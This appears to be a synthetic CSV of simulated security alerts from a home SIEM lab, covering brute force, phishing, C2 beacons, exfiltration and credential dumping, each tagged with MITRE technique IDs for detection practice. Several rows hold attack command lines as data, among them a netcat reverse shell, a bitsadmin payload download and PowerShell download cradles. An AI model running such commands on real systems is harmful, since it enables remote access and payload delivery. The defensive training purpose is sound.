access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,BLOCK,,,,,,,,,,,,,,192.168.56.103,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-RDP,,,,Low,,,,,103.45.78.21,,,,,,2026-04-20T08:05:37.668273,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,91.234.56.78,,,,,,2026-04-22T06:00:37.659531,,lab.administrator,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T02:56:37.664435,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T12:29:37.662895,,john.doe,,,
,,,,,,,,2571460,,,,,malware-drop[.]net,,192.168.56.104,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T04:10:37.666259,,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,34499,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-24T14:53:37.665230,Nmap,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,FIN-SERVER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-23T04:12:37.660979,,svc.backup,,,
,,,,,,,290,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T18:00:37.662532,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,WAZUH-MANAGER-01,,,,True,,Windows Security,,,,,T1068,,,SeTcbPrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T04:56:37.665362,,finance.user,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,msiexec.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T09:07:37.664996,,temp.analyst,,,
,,,,,,,,,,,,,,,23.129.64.100,8080,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,wmic.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-24T04:33:37.663466,,temp.analyst,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T13:16:37.664783,,temp.analyst,,,
,,,,,,,,,,,,,,,23.129.64.100,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET SCAN Nmap Detected,2707285,,,192.168.56.102,,,,,,2026-04-20T03:49:37.668808,,,,,
,,,,,,,,5767411,,,,,cobalt-beacon[.]onion,,77.73.133.84,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T02:18:37.666238,,,,,
,,,,,,,,3404264,,,,,cobalt-beacon[.]onion,,192.168.56.104,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-24T14:15:37.666378,,,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,finance.user@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Urgent Password Reset Required,,,,2026-04-20T19:23:37.669073,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.103,,,,,,2026-04-19T18:11:37.659859,,john.doe,,,
,,,,,,,,,192882331,,,,,,23.129.64.100,,,,,Data Exfiltration Suspected,,,,,SPLUNK-VM-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T08:13:37.666957,,attacker,,,
,,,,,,,,,368119611,,,,,,77.73.133.84,,,,,Data Exfiltration Suspected,,,,,WIN-PRAHARSH-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T10:43:37.666823,,praharsh.admin,,,
,,,,,document.docm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,dev.engineer@praharsh-lab.local,,,,,hr-support@secure-login[.]com,,High,,,,,,,ACTION REQUIRED: Verify your identity,,,,2026-04-24T10:36:37.669226,,,,,
,,,,,,,63,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T12:50:37.662168,Hydra / CrackMapExec,john.doe,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-20T23:49:37.659833,,lab.administrator,,,
,,,,,,,,,,,,cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T20:48:37.664421,Metasploit / Netcat,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-20T10:05:37.660867,,lab.administrator,,,
,,,,,,,,,,,,,,,23.129.64.100,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,wscript.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-22T11:30:37.663603,,jane.smith,,,
,,,172.16.0.100,WAZUH-MANAGER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T04:58:37.669500,,,,Rootkit detection attempt,5710
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,44936,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-23T12:17:37.665164,Nmap,,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-24T07:41:37.662831,,jane.smith,,,
,,,,,,,,3919240,,,,,evil-c2[.]com,,192.168.56.104,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T22:03:37.666308,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-22T20:51:37.659740,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-24T06:41:37.660027,,temp.analyst,,,
,,,192.168.56.103,KALI-LAB-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T06:47:37.669385,,,,Suspicious process spawned,5710
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.15,,,,,,2026-04-22T14:45:37.659937,,jane.smith,,,
,,,,,,,213,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T12:39:37.662305,Hydra / CrackMapExec,dev.engineer,,,
,,,,,,,272,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T17:59:37.662693,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,wscript.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-23T05:17:37.663714,,,,,
,,,,,,KALI-LAB-01,71,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T13:11:37.661681,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.103,,,,,,2026-04-20T00:11:37.660132,,temp.analyst,,,
,,,,,,,,,,,,,,,,,aGVsbG8.phish-praharsh-lab[.]xyz,,,DNS Tunneling Detected,,,,,ELK-SERVER-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,376,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-23T23:33:37.666775,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,172.16.0.100,,,,,,2026-04-23T02:06:37.660331,,dev.engineer,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,msiexec.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T12:36:37.664882,,john.doe,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.splunk,High,,,,,,,,,,,2026-04-21T03:29:37.662741,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T04:17:37.663082,,finance.user,,,
,,,,,,,,,,,,,,,194.165.16.11,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,SURICATA HTTP Reverse Shell Detected,2247625,,,172.16.0.100,,,,,,2026-04-21T18:03:37.668854,,,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-22T22:42:37.667055,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,regsvr32.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-21T12:49:37.664162,,,powershell -enc AAAA,,
,,,,,,,292,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T09:10:37.662181,Hydra / CrackMapExec,svc.backup,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T04:08:37.664581,,svc.backup,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-24T06:07:37.662812,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T20:17:37.663079,,dev.engineer,,,
,,,,,,,,,319742701,,,,,,45.67.22.10,,,,,Data Exfiltration Suspected,,,,,SPLUNK-VM-01,,,,,,Firewall,,,,,T1048,,,,,,SFTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T09:04:37.666839,,finance.user,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\praharsh.admin\Downloads\invoice.exe,,ELK-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Mimikatz,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-19T23:29:37.667474,,,,,
,,,,,,,234,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T00:42:37.661801,Hydra / CrackMapExec,finance.user,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,FIN-SERVER-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,WAZUH-MANAGER-01,,,,,,,2026-04-24T08:40:37.665962,,jane.smith,,,
,,,,,,,,,424427906,,,,,,77.73.133.84,,,,,Data Exfiltration Suspected,,,,,KALI-LAB-01,,,,,,Firewall,,,,,T1048,,,,,,SFTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T03:52:37.666807,,svc.backup,,,
,,,,,,,,766849,,,,,evil-c2[.]com,,91.234.56.78,4444,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T04:10:37.666169,,,,,
,,,,,,KALI-LAB-01,79,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T05:22:37.661617,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,wmic.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-20T06:57:37.663750,,,,,
,,,,,,KALI-LAB-01,242,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T08:19:37.661564,Hydra,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SMB,,,,Low,,,,,77.73.133.84,,,,,,2026-04-20T07:23:37.668658,,,,,
,,,,,,,,,,,powershell.exe -enc SQBFAFgA,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T10:28:37.664721,,svc.splunk,,,
,,,,,,KALI-LAB-01,478,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T10:31:37.661689,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Users\Public\shell.ps1,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,bitsadmin.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T06:15:37.663943,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T04:44:37.662909,,dev.engineer,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-PRAHARSH-01,192.168.56.103,,,,,,2026-04-20T10:08:37.665732,,praharsh.admin,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SMB,,,,Low,,,,,91.234.56.78,,,,,,2026-04-19T16:10:37.668221,,,,,
,,,,,,,,2872341,,,,,phish-praharsh-lab[.]xyz,,91.234.56.78,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T15:10:37.666389,,,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-21T08:22:37.662788,,svc.splunk,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,certutil.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T21:32:37.664932,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.102,,,,,,2026-04-22T04:17:37.661260,,praharsh.admin,,,
,,,,,,,,4768892,,,,,mimikatz-payload[.]ru,,103.45.78.21,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-24T14:52:37.666151,,,,,
,,,,,,,,,,,,,,,,,YmFzZTY0.data-exfil[.]io,,,DNS Tunneling Detected,,,,,KALI-LAB-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,195,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-21T14:15:37.666615,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,103.45.78.21,,,,,,2026-04-21T16:15:37.660173,,svc.splunk,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Users\Public\malware.exe,,WAZUH-MANAGER-01,,,,,,Windows Defender / Wazuh,,,,Cobalt.Strike.Beacon,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T21:04:37.667362,,,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T02:19:37.663032,,praharsh.admin,,,
,,,,,,KALI-LAB-01,340,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T16:16:37.661628,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T13:00:37.663134,,jane.smith,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.102,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,194.165.16.11,,,,,,2026-04-21T18:47:37.668518,,,,,
,,,,,,,,,238774389,,,,,,103.45.78.21,,,,,Data Exfiltration Suspected,,,,,KALI-LAB-01,,,,,,Firewall,,,,,T1048,,,,,,SFTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T03:22:37.667004,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Users\Public\shell.ps1,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,bitsadmin.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T16:50:37.663848,,attacker,,,
,,,,,,,,,,,,,,,103.45.78.21,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Medium,ET SCAN Nmap Detected,2273783,,,192.168.56.102,,,,,,2026-04-24T10:28:37.668761,,,,,
,,,,,,KALI-LAB-01,179,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T16:15:37.661560,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,23.129.64.100,4444,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,wmic.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-20T15:30:37.663653,,john.doe,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,e10adc3949ba59abbe56e057f20f883e,C:\Users\Public\malware.exe,,DEV-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T20:48:37.667244,,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,60317,,,,,,,,,,,Version Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-24T09:01:37.665069,Nmap,,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,svc.splunk@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,Your account has been compromised,,,,2026-04-19T20:38:37.669260,,,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,WIN-PRAHARSH-01,,,Process Hollowing,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,mshta.exe,,,lsass.exe,,2026-04-20T16:34:37.667668,,,,,
,,,,,,KALI-LAB-01,415,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T21:34:37.661700,Hydra,lab.administrator,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-20T16:57:37.667026,,attacker,,,
,,,,,,,,,328297425,,,,,,91.234.56.78,,,,,Data Exfiltration Suspected,,,,,WIN-PRAHARSH-01,,,,,,Firewall,,,,,T1048,,,,,,FTP,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T04:45:37.666920,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,194.165.16.11,,,,,,2026-04-19T20:51:37.659828,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,mshta.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-23T21:21:37.664002,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,United States,China,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,16,2026-04-23T21:55:37.668028,,attacker,,,
,AttachAdminPolicy,,,,,,,,,Azure,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-20T09:41:37.667925,,temp.analyst,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-20T06:43:37.665828,,svc.splunk,,,
